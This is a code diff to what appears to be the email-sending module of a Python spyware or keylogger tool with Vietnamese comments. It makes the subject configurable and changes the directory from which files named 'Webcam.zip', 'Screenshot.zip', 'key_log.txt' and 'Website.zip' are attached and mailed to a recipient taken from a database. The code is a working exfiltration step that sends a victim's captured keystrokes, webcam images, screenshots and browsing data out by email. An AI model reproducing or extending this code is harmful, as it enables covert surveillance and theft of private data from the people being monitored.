@@ -32,6 +32,7 @@ deli = getRowValue('EmailDelivery',uid)
 
 fromaddr = deli[4] # uname
 toaddr = deli[1] # sendto
+subj = deli[6]
   
 # instance of MIMEMultipart
 msg = MIMEMultipart()
@@ -43,7 +44,7 @@ msg['From'] = fromaddr
 msg['To'] = toaddr
  
 # storing the subject 
-msg['Subject'] = "Test send mail"
+msg['Subject'] = subj
  
 # string to store the body of the mail
 body = "Body_of_the_mail"
@@ -51,7 +52,7 @@ body = "Body_of_the_mail"
 # attach the body with the msg instance
 msg.attach(MIMEText(body, 'plain'))
 
-dir_path = "..\\" # thu muc chua file can gui
+dir_path = "./"#"..\\..\\" # thu muc chua file can gui
 # cac file can gui
 files = ["Webcam.zip","Screenshot.zip","key_log.txt","Website.zip"]
 #files = ['key_log.txt','acb.txt']
